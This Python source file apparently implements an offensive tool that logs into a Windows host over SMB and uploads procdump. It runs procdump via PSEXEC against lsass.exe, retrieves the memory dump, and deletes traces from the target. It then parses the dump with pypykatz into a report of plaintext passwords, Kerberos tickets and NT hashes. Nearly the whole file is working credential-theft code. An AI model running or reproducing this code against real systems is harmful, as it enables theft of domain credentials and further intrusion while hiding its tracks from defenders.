#!/usr/bin/python3
import sys
import re
from configparser import ConfigParser
from argparse import Namespace
import pdb
import json

###############CrackMapExec##############################
sys.path.append("CrackMapExec/")
from cme.loaders.protocol_loader import protocol_loader
from cme.cli import gen_cli_args

#########################################################
import os
import sqlite3
from configuration import protocol_db_path, protocol_path, src_x32, src_x64
from os import path
from impacket.smbconnection import SMBConnection
from impacket.smbconnection import *
from impacket.dcerpc.v5.rpcrt import DCERPCException
from impacket.dcerpc.v5.transport import DCERPCTransportFactory
from impacket.dcerpc.v5.epm import MSRPC_UUID_PORTMAP

########impacket#########
from psexec import PSEXEC

############################


#########################Pypykatz##############################
sys.path.append("pypykatz/pypykatz")
# from pypykatz import pypykatz

from pypykatz.utils.crypto.cmdhelper import CryptoCMDHelper
from pypykatz.ldap.cmdhelper import LDAPCMDHelper
from pypykatz.kerberos.cmdhelper import KerberosCMDHelper
from pypykatz.lsadecryptor.cmdhelper import LSACMDHelper
from pypykatz.registry.cmdhelper import RegistryCMDHelper
from pypykatz.remote.cmdhelper import RemoteCMDHelper

###############################################################

#########SMBMAP##########
sys.path.append("smbmap")
from smbmap import SMBMap

########################


class Dumper:
    def __init__(self, username, password, domain, target):
        self.target = target
        if domain is None:
            domain = ""
        self.credentials = {
            "username": username,
            "password": password,
            "domain": domain,
        }
        self.smb_impacket = SMBConnection(
            self.target, self.target, sess_port=445, timeout=4
        )
        self.host_info = self.enum_host_info()
        # self.smb_smbmap = SMBMap().login(
        #     host=self.host_info["target"],
        #     username=self.credentials["username"],
        #     password=self.credentials["password"],
        #     domain=self.credentials["domain"],
        # )

        self.run()

    def enum_host_info(self):
        info_dict = {}
        self.smb_impacket.login(
            user=self.credentials["username"],
            password=self.credentials["password"],
            domain=self.credentials["domain"],
        )
        os = self.smb_impacket.getServerOS()
        arch = self.get_arch()
        # pdb.set_trace()
        domain = self.smb_impacket.getServerDomain()
        info_dict.update({"target": self.target})
        info_dict.update({"os": os})
        info_dict.update({"domain": domain})
        info_dict.update({"arch": arch})
        # sys.argv.insert(1, "smb")
        # args = gen_cli_args()
        # cme_path = os.path.expanduser("~/.cme")
        # config = ConfigParser()
        # config.read(os.path.join(cme_path, "cme.conf"))
        # current_workspace = config.get("CME", "workspace")
        # p_loader = protocol_loader()
        # protocol_object = getattr(p_loader.load_protocol(protocol_path), "smb")
        # protocol_db_object = getattr(
        #     p_loader.load_protocol(protocol_db_path), "database"
        # )
        # db_path = os.path.join(
        #     cme_path, "workspaces", current_workspace, args.protocol + ".db"
        # )
        # # set the database connection to autocommit w/ isolation level
        # db_connection = sqlite3.connect(db_path, check_same_thread=False)
        # db_connection.text_factory = str
        # db_connection.isolation_level = None
        # db = protocol_db_object(db_connection)
        #
        # setattr(protocol_object, "config", config)
        # for target in args.target:
        #     data = protocol_object(args, db, str(target))
        #     server_os = data.server_os
        # os_arch = data.os_arch
        # domain = data.domain
        # if len(args.username) != 0:
        #     self.credentials.update({"username": args.username[0]})
        # if len(args.password) != 0:
        #     self.credentials.update({"password": args.password[0]})
        # if args.domain is not None:
        #     self.credentials.update({"domain": args.domain})
        # else:
        #     self.credentials.update({"domain": str(domain)})
        # info_dict = {}
        # if (
        #     "username" in self.credentials.keys()
        #     and "password" in self.credentials.keys()
        # ):
        #     if "domain" in self.credentials.keys():
        #         if self.credentials["domain"] is not None:
        #             logon_status = data.plaintext_login(
        #                 self.credentials["domain"],
        #                 self.credentials["username"],
        #                 self.credentials["password"],
        #             )
        #         else:
        #             logon_status = data.plaintext_login(
        #                 domain,
        #                 self.credentials["username"],
        #                 self.credentials["password"],
        #             )
        #     else:
        #         logon_status = data.plaintext_login(
        #             domain,
        #             self.credentials["username"],
        #             self.credentials["password"],
        #         )
        #     if not logon_status:
        #         logon_status = "STATUS_LOGON_FAILURE"
        #         info_dict.update({"logon_status": logon_status})
        #
        #     else:
        #         logon_status = "SUCCESS"
        #         info_dict.update({"logon_status": logon_status})
        # info_dict.update(
        #     {"os": server_os, "arch": os_arch, "domain": domain, "target": target}
        # )
        return info_dict

    def get_arch(self):
        try:
            NDR64Syntax = ("71710533-BEBA-4937-8319-B5DBEF9CCC36", "1.0")
            stringBinding = r"ncacn_ip_tcp:%s[135]" % self.target
            transport = DCERPCTransportFactory(stringBinding)
            transport.set_connect_timeout(int(10))
            dce = transport.get_dce_rpc()
            dce.connect()
            try:
                dce.bind(MSRPC_UUID_PORTMAP, transfer_syntax=NDR64Syntax)
            except DCERPCException as e:
                if str(e).find("syntaxes_not_supported") >= 0:
                    return 32
                else:
                    pass
            else:
                return 64
            dce.disconnect()
        except Exception:
            return None

    def upload_file(self):
        if self.host_info["arch"] == 64:
            src = src_x64
        elif self.host_info["arch"] == 32:
            src = src_x32
        # self.smb_impacket.login(
        #     self.credentials["username"],
        #     self.credentials["password"],
        #     domain=self.credentials["domain"],
        # )
        filename = re.sub(r"\d+", "", path.basename(src))
        self.smb_impacket.putFile("C$", filename, open(src, "rb").read)
        # self.smb.logoff()

    def upload_file_smbmap(self):
        if self.host_info["arch"] == 64:
            src = src_x64
        elif self.host_info["arch"] == 32:
            src = src_x32
        dst = "C$\procdump.exe"
        self.smb_smbmap.upload_file(self.host_info["target"], src, dst)

        # def enum_shares(self):
        #     host = self.host_info["target"]
        #     smb = SMBConnection(host, host, sess_port=445, timeout=4)
        #     smb.login(
        #         self.credentials["username"],
        #         self.credentials["password"],
        #         domain=self.credentials["domain"],
        #     )
        #     shareList = smb.listShares()
        #     shares = []
        #     for item in range(len(shareList)):
        #         shares.append(
        #             {
        #                 "share_name": shareList[item]["shi1_netname"][:-1],
        #                 "share_remark": shareList[item]["shi1_remark"][:-1],
        #             }
        #         )

    def exec_procdump(self):
        # pdb.set_trace()
        # logger.init()

        # executer = WMIEXEC(
        #     command=" ".join(["procdump.exe -ma lsass.exe lsass_dump"]),
        #     username=self.credentials["username"],
        #     password=self.credentials["password"],
        #     domain=self.credentials["domain"],
        #     hashes=None,
        #     aesKey=None,
        #     share="C$",
        #     noOutput=False,
        #     doKerberos=False,
        #     kdcHost=None,
        # )
        # executer.run(self.host_info["target"])
        executer = PSEXEC(
            " ".join(["C:\\procdump.exe -ma lsass.exe C:\\lsass_dump"]),
            None,
            None,
            None,
            int(445),
            self.credentials["username"],
            self.credentials["password"],
            self.credentials["domain"],
            None,
            None,
            False,
            None,
            "",
        )
        executer.run(
            remoteName=self.host_info["target"], remoteHost=self.host_info["target"]
        )

    # def exec_procdump_smbmap(self):

    #    self.smb_smbmap.exec_command()

    def dump_lsass(self):
        print("Dumping")
        self.smb_impacket.getFile(
            "C$", "/lsass_dump.dmp", open("lsass_dump.dmp", "wb").write
        )
        print("Finished")

    def clear_out(self):
        print("Starting ClearOut")
        self.smb_impacket.deleteFile("C$", "/lsass_dump.dmp")
        self.smb_impacket.deleteFile("C$", "/procdump.exe")
        self.smb_impacket.close()
        print("ClearOut Finished")

    @staticmethod
    def dump_to_pypykatz(dump_file="./lsass_dump.dmp"):
        print("Pypykatz doing his job...")

        cmdhelpers = [
            LSACMDHelper(),
            RegistryCMDHelper(),
            CryptoCMDHelper(),
            LDAPCMDHelper(),
            KerberosCMDHelper(),
            RemoteCMDHelper(),
        ]
        args = Namespace()
        args.cmd = "minidump"

        args.command = "lsa"
        args.directory = False
        args.halt_on_error = False
        args.json = True
        args.kerberos_dir = False
        args.memoryfile = dump_file
        args.outfile = "temp_report.json"
        args.recursive = False
        args.timestamp_override = None
        args.verbose = 0

        for helper in cmdhelpers:
            helper.execute(args)
        print("Removing dump file")
        os.remove(dump_file)
        print("Finished")

    @staticmethod
    def create_report(filename):
        print("Creating report")
        with open("./temp_report.json", "r") as jf:
            parsed = json.load(jf)["./lsass_dump.dmp"]
            with open(filename, "w") as report:
                for el in parsed["logon_sessions"]:
                    temp = parsed["logon_sessions"][el]
                    # if len(temp["credman_creds"]) > 0:
                    #     report.write("Haven`t seen them. Sure they exist?\n")
                    # if len(temp["dpapi_creds"]) > 0:
                    #     report.write(
                    #         "I don`t know, how to use something named DPAPI, but whatever\n"
                    #     )
                    if len(temp["kerberos_creds"]) > 0:
                        for cr in temp["kerberos_creds"]:
                            if cr["username"] is not None:
                                if cr["password"] is not None:
                                    report.write(
                                        f"From Kerberos (Domain/username:password) -- {cr['domainname']}/{cr['username']}:{cr['password']}\n"
                                    )
                                elif len(cr["tickets"]) > 0:
                                    report.write(
                                        f"From Kerberos (Domain/username:tickets) -- {cr['domainname']}/{cr['username']}:{cr['tickets']}\n"
                                    )
                    if len(temp["livessp_creds"]) > 0:
                        report.write("Did not expect creds to be in livessp\n")
                    if len(temp["ssp_creds"]) > 0:
                        for cr in temp["ssp_creds"]:
                            if cr["username"] is not None:
                                if cr["password"] is not None:
                                    report.write(
                                        f"From SSP (Domain/username:password) -- {cr['domainname']}/{cr['username']}:{cr['password']}\n"
                                    )
                    if len(temp["tspkg_creds"]) > 0:
                        report.write(
                            "Have no idea, what is tspkg and how to parse it\n"
                        )
                    if len(temp["wdigest_creds"]) > 0:
                        for cr in temp["wdigest_creds"]:
                            if cr["username"] is not None:
                                if cr["password"] is not None:
                                    report.write(
                                        f"From Wdigest (Domain/username:password) -- {cr['domainname']} / {cr['username']}:{cr['password']}\n"
                                    )
                    if len(temp["msv_creds"]) > 0:
                        for cr in temp["msv_creds"]:
                            if cr["username"] is not None:
                                if cr["NThash"] is not None:
                                    report.write(
                                        f"From MSV (Domain/username:NThash) -- {cr['domainname']} / {cr['username']}:{cr['NThash']}\n"
                                    )

                for el in parsed["orphaned_creds"]:
                    # temp = parsed["orphaned_creds"][el]
                    if "username" in el.keys() and el["username"] is not "":
                        if el["password"] is not None:
                            report.write(
                                f"From orphaned creds (Domain/username:password) -- {el['domainname']}/{el['username']}:{el['password']}\n"
                            )
                        elif "tickets" in el.keys() and len(el["tickets"]) > 0:
                            report.write(
                                f"From orphaned creds (Domain/username:tickets) -- {el['domainname']}/{el['username']}:{el['tickets']}\n"
                            )
        # pdb.set_trace()
        os.remove("./temp_report.json")
        print("Finished :)")

    def run(self):
        # if self.host_info["logon_status"] != "":
        #     pass
        self.upload_file()
        # self.upload_file_smbmap()
        self.exec_procdump()
        self.dump_lsass()
        self.clear_out()
        Dumper.dump_to_pypykatz("./lsass_dump.dmp")
        # Dumper.dump_to_pypykatz("./dump.kek.dmp")
        # Dumper.create_report("test_report.txt")
        Dumper.create_report(f'./reports/{self.host_info["target"]}_report.txt')
